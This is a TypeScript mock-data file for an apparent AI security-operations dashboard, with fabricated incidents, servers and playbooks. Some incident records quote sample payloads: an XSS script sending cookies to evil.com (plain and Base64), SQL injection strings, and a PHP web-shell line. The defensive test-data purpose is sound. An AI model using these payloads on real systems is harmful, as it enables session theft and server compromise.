import type { 
  SystemHealth, 
  Incident, 
  VictimServer, 
  Playbook, 
  UserProfile, 
  NotificationSettings 
} from '../types';

export const mockSystemHealth: SystemHealth = {
  overallThreatScore: 84,
  agentRunning: true,
  pendingActions: 3,
  components: [
    { id: 'fastapi', name: 'AI Backend (FastAPI)', status: 'connected', latencyMs: 12, lastSeen: '2026-04-22T17:15:00Z' },
    { id: 'elasticsearch', name: 'Elasticsearch', status: 'connected', latencyMs: 34, lastSeen: '2026-04-22T17:15:05Z' },
    { id: 'victim1', name: 'Web Server (Victim)', status: 'connected', latencyMs: 8, lastSeen: '2026-04-22T17:15:10Z' },
  ],
};

export const mockIncidents: Incident[] = [
  {
    id: 'INC-2024-001',
    attack_type: 'Stored Cross-Site Scripting (XSS)',
    threatLevel: 'CRITICAL',
    confidence_score: 0.97,
    status: 'PENDING',
    targetIp: '192.168.1.50',
    targetName: 'Web Server (Victim)',
    detectedAt: '2026-04-22T17:08:00Z',
    created_at: '2026-04-22T17:08:00Z',
    mitre_attack_ids: ['T1059.007', 'T1190'],
    iocs: {
      attacker_ips: ['45.33.22.11'],
      target_uris: ['/api/v1/comments'],
    },
    executive_summary: 'AI agent detected a persistent XSS attempt on the comments API. The payload contains an obfuscated script designed to steal session cookies from administrative users.',
    detailed_analysis: '### Analysis Details\n1. **Payload Identification**: The request body contains `<script>fetch("http://evil.com/?"+document.cookie)</script>` encoded in Base64.\n2. **Database Verification**: The payload was successfully stored in the `comments` table.\n3. **Risk Assessment**: High. Any user viewing the comments section will execute this script in their browser context.',
    key_indicators: [
      { label: 'Payload in DB', value: true, description: 'Malicious script confirmed in database' },
      { label: 'Administrative Context', value: true, description: 'Targeted at admin dashboard users' },
      { label: 'Previous Attempts', value: false, description: 'No prior attempts from this IP' }
    ],
    raw_log: '{"timestamp":"2026-04-22T17:08:00Z","method":"POST","path":"/api/v1/comments","body":{"content":"PHNjcmlwdD5mZXRjaCgiaHR0cDovL2V2aWwuY29tLz8iK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4="},"headers":{"x-forwarded-for":"45.33.22.11"}}',
    recommended_actions: [
      { id: 'rec-1', action: 'Clean Database', parameter: 'DELETE FROM comments WHERE id=402', description: 'Remove the malicious comment from the database.' },
      { id: 'rec-2', action: 'Block IP', parameter: '45.33.22.11', description: 'Block the attacker\'s IP address at the firewall level.' }
    ]
  },
  {
    id: 'INC-2024-002',
    attack_type: 'SQL Injection Attempt',
    threatLevel: 'CRITICAL',
    confidence_score: 0.92,
    status: 'PENDING',
    targetIp: '192.168.1.50',
    targetName: 'Web Server (Victim)',
    detectedAt: '2026-04-22T16:45:00Z',
    created_at: '2026-04-22T16:45:00Z',
    mitre_attack_ids: ['T1190'],
    iocs: {
      attacker_ips: ['103.45.67.89'],
      target_uris: ['/login.php'],
    },
    executive_summary: 'Automated SQL injection attempt detected on the login portal. The attacker is using boolean-based blind techniques to enumerate database schema.',
    detailed_analysis: '### Analysis Details\n1. **Pattern Matching**: Multiple requests with `\' OR 1=1--` pattern found.\n2. **Frequency**: 45 requests in 10 seconds.',
    key_indicators: [
      { label: 'SQLi Pattern', value: true, description: 'Known SQL injection pattern detected' },
      { label: 'High Frequency', value: true, description: 'Potential automated scanning' }
    ],
    raw_log: '103.45.67.89 - - [22/Apr/2026:16:45:00 +0000] "POST /login.php HTTP/1.1" 200 - "username=admin\' OR \'1\'=\'1"',
    recommended_actions: [
      { id: 'rec-3', action: 'Block IP', parameter: '103.45.67.89', description: 'Block attacker IP.' }
    ]
  },
  {
    id: 'INC-2024-003',
    attack_type: 'Suspicious File Upload',
    threatLevel: 'WARNING',
    confidence_score: 0.75,
    status: 'RESOLVED',
    targetIp: '192.168.1.52',
    targetName: 'File Server',
    detectedAt: '2026-04-22T15:20:00Z',
    created_at: '2026-04-22T15:20:00Z',
    mitre_attack_ids: ['T1505.003'],
    iocs: {
      attacker_ips: ['172.16.0.44'],
      target_uris: ['/uploads/profile.php'],
    },
    executive_summary: 'A PHP file was uploaded to a directory intended for images only. AI analysis suggests it might be a simple web shell.',
    detailed_analysis: 'File contains `eval($_GET["cmd"])`. Successfully isolated.',
    key_indicators: [],
    raw_log: 'inotify_event: CREATE profile.php in /var/www/uploads',
    recommended_actions: []
  },
  {
    id: 'INC-2024-004',
    attack_type: 'Brute Force Attack',
    threatLevel: 'WARNING',
    confidence_score: 0.88,
    status: 'RESOLVED',
    targetIp: '192.168.1.10',
    targetName: 'SSH Gateway',
    detectedAt: '2026-04-22T14:10:00Z',
    created_at: '2026-04-22T14:10:00Z',
    mitre_attack_ids: ['T1110.001'],
    iocs: {
      attacker_ips: ['192.168.1.200'],
      target_uris: ['ssh:22'],
    },
    executive_summary: 'Multiple failed SSH login attempts from an internal IP address.',
    detailed_analysis: 'Over 100 failed attempts within 5 minutes using common usernames.',
    key_indicators: [],
    raw_log: 'Apr 22 14:10:01 gateway sshd[1234]: Failed password for root from 192.168.1.200 port 5678 ssh2',
    recommended_actions: []
  },
  {
    id: 'INC-2024-005',
    attack_type: 'Unauthorized API Access',
    threatLevel: 'CRITICAL',
    confidence_score: 0.95,
    status: 'PENDING',
    targetIp: '192.168.1.50',
    targetName: 'Web Server (Victim)',
    detectedAt: '2026-04-22T13:00:00Z',
    created_at: '2026-04-22T13:00:00Z',
    mitre_attack_ids: ['T1567'],
    iocs: {
      attacker_ips: ['203.0.113.5'],
      target_uris: ['/admin/config/dump'],
    },
    executive_summary: 'Access attempt to sensitive administrative endpoint without a valid authorization token.',
    detailed_analysis: 'Endpoint `/admin/config/dump` is reserved for internal backup scripts.',
    key_indicators: [],
    raw_log: '203.0.113.5 - - [22/Apr/2026:13:00:00 +0000] "GET /admin/config/dump HTTP/1.1" 403 0',
    recommended_actions: []
  }
];

export const mockVictimServers: VictimServer[] = [
  {
    id: 'srv-1',
    name: 'Web Server (Victim)',
    ip: '192.168.1.50',
    os: 'Linux',
    registered: '2026-04-01T09:00:00Z',
    agentStatus: 'connected',
    lastSeen: '2026-04-22T17:15:10Z'
  },
  {
    id: 'srv-2',
    name: 'Database Server',
    ip: '192.168.1.51',
    os: 'Linux',
    registered: '2026-04-01T09:00:00Z',
    agentStatus: 'connected',
    lastSeen: '2026-04-22T17:14:30Z'
  },
  {
    id: 'srv-3',
    name: 'File Storage',
    ip: '192.168.1.52',
    os: 'Linux',
    registered: '2026-04-05T10:00:00Z',
    agentStatus: 'disconnected',
    lastSeen: '2026-04-22T12:00:00Z'
  }
];

export const mockPlaybooks: Playbook[] = [
  {
    id: 'pb-1',
    fileName: 'XSS_Response_Guide.pdf',
    fileType: 'PDF',
    fileSize: 1240000,
    uploadedAt: '2026-04-10T10:00:00Z',
    syncStatus: 'synced'
  },
  {
    id: 'pb-2',
    fileName: 'SQLi_Mitigation_Manual.docx',
    fileType: 'DOCX',
    fileSize: 850000,
    uploadedAt: '2026-04-12T14:30:00Z',
    syncStatus: 'synced'
  },
  {
    id: 'pb-3',
    fileName: 'Internal_Security_Policy.md',
    fileType: 'MD',
    fileSize: 45000,
    uploadedAt: '2026-04-20T09:15:00Z',
    syncStatus: 'synced'
  },
  {
    id: 'pb-4',
    fileName: 'New_Ransomware_Alert.txt',
    fileType: 'TXT',
    fileSize: 12000,
    uploadedAt: '2026-04-22T16:00:00Z',
    syncStatus: 'vectorizing'
  }
];

export const mockUserProfile: UserProfile = {
  name: '관리자',
  email: 'admin@ai-soc.com',
  role: 'Admin'
};

export const mockNotificationSettings: NotificationSettings = {
  email: 'alerts@ai-soc.com',
  webhookUrl: 'https://hooks.slack.com/services/T0000/B0000/XXXX',
  minSeverity: 'WARNING'
};

